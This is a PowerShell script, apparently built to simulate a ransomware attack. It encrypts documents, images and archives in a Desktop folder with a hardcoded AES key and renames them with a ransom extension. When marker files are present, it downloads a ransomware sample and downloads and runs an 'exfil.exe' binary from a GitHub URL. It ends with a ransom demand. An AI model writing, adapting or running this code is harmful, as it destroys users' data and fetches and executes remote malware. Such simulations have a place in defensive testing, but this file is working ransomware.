$Folder = $HOME + '/Desktop/ImportantDocuments/'
$Exfil = $HOME + '/Desktop/exfil'
$sample = $HOME + '/Desktop/darkpower'

"Test to see if folder [$Folder] exists - v3"
if (Test-Path -Path $Folder) {
  $aes = new-object System.Security.Cryptography.AesCryptoServiceProvider; 
  $aes.KeySize = 128; 
  $aes.Mode = 4; 
  $aes_crypt = $aes.CreateEncryptor([System.Security.Cryptography.Rfc2898DeriveBytes]::new("RansomAllTheThings!",@([byte]1,2,3,4,5,6,7,8)).GetBytes(16), @([byte]16,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1)); 
  $Folder | ForEach-Object {    Get-ChildItem -Path $Folder -Include "*.txt","*.doc","*.docx","*.pdf","*.jpeg","*.jpg","*.gif","*.png","*.xls","*.xlsx","*.zip","*.ppt","*.pptx" -Recurse | Where { $_.Length -le "200mb" } | ForEach-Object {       $c = [System.IO.File]::ReadAllBytes($_.FullName);       $cs = [System.Security.Cryptography.CryptoStream]::new($_.OpenWrite(), $aes_crypt, [System.Security.Cryptography.CryptoStreamMode]::Write);       $cs.Write($c, 0, $c.Length);       $cs.Close();       $_.MoveTo($_.FullName + ".ransomallthethings");    }} 
  Add-Type -AssemblyName PresentationCore,PresentationFramework 
  "Test to see if we are exfil-ing"
  if (Test-Path -Path $sample -PathType Leaf) {
    "******** Will download ransomware - DANGEROUS **************"
    $URL = 'https://github.com/PoesRaven/public/raw/master/darkpower.zip'
    $SamplePath = $HOME + '/Desktop/darkpower.zip'
    $DestinationPath = $HOME + '/Desktop/darkpower'
    $File = 'darkpower.exe'
    $FullFile = $DestinationPath + '\' + $File
    "Grabbing file"
    Invoke-WebRequest -URI $URL -OutFile $SamplePath
    "Wait 5 seconds"
    Start-Sleep -Seconds 5
    "Decompressing file"
    Expand-Archive $SamplePath -DestinationPath $DestinationPath
    "Wait 5 seconds"
    Start-Sleep -Seconds 5
    $FullFile
    Remove-Item $FullFile
  }  else {
    "Will not download ransomware"
  }
  
  if (Test-Path -Path $Exfil -PathType Leaf) {
    "Will exfil"
    $URL = 'https://github.com/PoesRaven/public/raw/master/exfil.exe'
    $ExfilPath = $HOME + '/Desktop/exfil.exe'
    "Grabbing file"
    Invoke-WebRequest -URI $URL -OutFile $ExfilPath
    "Wait 5 seconds"
    Start-Sleep -Seconds 5
    "Running file"
    Start-Process -FilePath $ExfilPath
  } else {
    "Will not exfil"
  }
  
  
  $msgBody = "All of your important documents have been encrypted. Pay the ransom... or else!!!" 
  [System.Windows.MessageBox]::Show($msgBody)
  "Path exists!"
} else {
    dir;
    "Path doesn't exist."
}
